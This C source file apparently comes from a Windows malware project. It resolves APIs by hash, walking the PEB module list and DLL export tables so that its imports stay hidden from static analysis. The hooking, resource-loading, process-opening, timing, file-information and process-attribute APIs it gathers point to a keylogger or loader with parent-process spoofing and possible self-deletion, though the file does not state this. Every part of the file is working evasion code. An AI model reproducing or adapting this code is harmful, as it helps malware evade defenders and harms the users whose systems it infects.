#include "Common.h"

FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValue)
{
	// Checking if the module is valid
	if (!hModule)
		return NULL;

	// We do this to avoid casting each time we use 'hModule'
	PBYTE pBase = (PBYTE)hModule;

	// Getting the export directory
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (GetImageExportDirectory(hModule, &pImageExportDirectory) == FALSE) {
		PRINTA("[!] GetImageExportDirectory Failed\n");
		return FALSE;
	}
	//PRINTA("[+] Found EAT Of %p Handle At %p\n", pBase, pImageExportDirectory);

	// Getting the function's names array pointer
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfFunctions);
	// Getting the function's addresses array pointer
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfNames);
	// Getting the function's ordinal array pointer
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfNameOrdinals);

	// Looping through all the exported functions
	// Looping through all the exported functions
	for (DWORD i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {

		// Getting the name of the function
		CHAR* pFunctionName = (CHAR*)(pBase + pdwAddressOfNames[i]);

		// Getting the ordinal of the function
		WORD wFunctionOrdinal = pwAddressOfNameOrdinales[i];

		// Getting the address of the function through it's ordinal
		if (dwApiNameHashValue == RTIME_HASHA(pFunctionName)) {
			PVOID pFunctionAddress = (PVOID)(pBase + pdwAddressOfFunctions[wFunctionOrdinal]);
			PRINTA("[+] Found API - Name: %s - Address: 0x%p - Ordinal: %d\n", pFunctionName, pFunctionAddress, wFunctionOrdinal);
			return  pFunctionAddress;
		}
	}

	PRINTA("[!] Can Not Find API - \t Hash: %d\n", dwApiNameHashValue);
	return NULL;
}

HMODULE GetModuleHandleByHashValue(IN DWORD dwModuleNameHashValue)
{
	// Getting peb
	PPEB			pPeb = RtlGetProcessEnvironmentBlock();

	// Getting the LoaderData field
	PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb->LoaderData);

	// Getting the first element in the linked list which contains information about the first module
	PLDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(pLdr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks.Flink);

	while (pDte) {
		// If not null
		if (pDte->FullDllName.Length != NULL) {
			// Check if both equal
			PWSTR moduleName = pDte->FullDllName.Buffer;
			PWSTR lowerModuleName = LowerCaseStringW(moduleName);
			if (dwModuleNameHashValue == RTIME_HASHW(lowerModuleName)) {
				HMODULE hModule = (HMODULE)(pDte->InInitializationOrderLinks.Flink);
				PRINTW(L"[+] Found Dll \"%s\" at %p\n", pDte->FullDllName.Buffer, (PVOID)hModule);
				return hModule;
			}
		}
		else {
			break;
		}
		// Next element in the linked list
		pDte = (PLDR_DATA_TABLE_ENTRY)pDte->InLoadOrderLinks.Flink;

	}

	return NULL;
}

API_HASHING g_Api = { 0 };

BOOL InitializeWinApis()
{
	//	User32.dll exported
	HMODULE hUser32Dll = GetModuleHandleByHashValue(USER32DLLHashValue);

	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressByHashValue(
		hUser32Dll,
		CallNextHookExHashValue
	);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressByHashValue(
		hUser32Dll,
		DefWindowProcWHashValue
	);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressByHashValue(
		hUser32Dll,
		GetMessageWHashValue
	);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressByHashValue(
		hUser32Dll,
		SetWindowsHookExWHashValue
	);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressByHashValue(
		hUser32Dll,
		UnhookWindowsHookExHashValue
	);

	if (g_Api.pCallNextHookEx == NULL ||
		g_Api.pDefWindowProcW == NULL ||
		g_Api.pGetMessageW == NULL ||
		g_Api.pSetWindowsHookExW == NULL ||
		g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	// 	Kernel32.dll exported
	HMODULE hKernel32Dll = GetModuleHandleByHashValue(KERNEL32DLLHashValue);

	g_Api.pFindResourceW = (fnFindResourceW)GetProcAddressByHashValue(
		hKernel32Dll,
		FindResourceWHashValue
	);
	g_Api.pLoadResource = (fnLoadResource)GetProcAddressByHashValue(
		hKernel32Dll,
		LoadResourceHashValue
	);
	g_Api.pLockResource = (fnLockResource)GetProcAddressByHashValue(
		hKernel32Dll,
		LockResourceHashValue
	);
	g_Api.pSizeofResource = (fnSizeofResource)GetProcAddressByHashValue(
		hKernel32Dll,
		SizeofResourceHashValue
	);
	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressByHashValue(
		hKernel32Dll,
		OpenProcessHashValue
	);
	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressByHashValue(
		hKernel32Dll,
		GetModuleFileNameWHashValue
	);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressByHashValue(
		hKernel32Dll,
		CreateFileWHashValue
	);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressByHashValue(
		hKernel32Dll,
		GetTickCount64HashValue
	);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressByHashValue(
		hKernel32Dll,
		SetFileInformationByHandleHashValue
	);
	g_Api.pGetEnvironmentVariableA = (fnGetEnvironmentVariableA)GetProcAddressByHashValue(
		hKernel32Dll,
		GetEnvironmentVariableAHashValue
	);
	g_Api.pCreateProcessA = (fnCreateProcessA)GetProcAddressByHashValue(
		hKernel32Dll,
		CreateProcessAHashValue
	);

	// Kernelbase.dll exported
	HANDLE hKernelBaseDll = GetModuleHandleByHashValue(KERNELBASEHashValue);

	g_Api.pInitializeProcThreadAttributeList = (fnInitializeProcThreadAttributeList)GetProcAddressByHashValue(
		hKernelBaseDll,
		InitializeProcThreadAttributeListHashValue
	);
	g_Api.pUpdateProcThreadAttribute = (fnUpdateProcThreadAttribute)GetProcAddressByHashValue(
		hKernelBaseDll,
		UpdateProcThreadAttributeHashValue
	);
	g_Api.pDeleteProcThreadAttributeList = (fnDeleteProcThreadAttributeList)GetProcAddressByHashValue(
		hKernelBaseDll,
		DeleteProcThreadAttributeListHashValue
	);

	if (g_Api.pFindResourceW == NULL ||
		g_Api.pLoadResource == NULL ||
		g_Api.pLockResource == NULL ||
		g_Api.pOpenProcess == NULL ||
		g_Api.pSizeofResource == NULL ||
		g_Api.pGetModuleFileNameW == NULL ||
		g_Api.pCreateFileW == NULL ||
		g_Api.pGetTickCount64 == NULL ||
		g_Api.pSetFileInformationByHandle == NULL ||
		g_Api.pGetEnvironmentVariableA == NULL ||
		g_Api.pCreateProcessA == NULL ||
		g_Api.pInitializeProcThreadAttributeList == NULL ||
		g_Api.pUpdateProcThreadAttribute == NULL ||
		g_Api.pDeleteProcThreadAttributeList == NULL)
		return FALSE;

	return TRUE;
}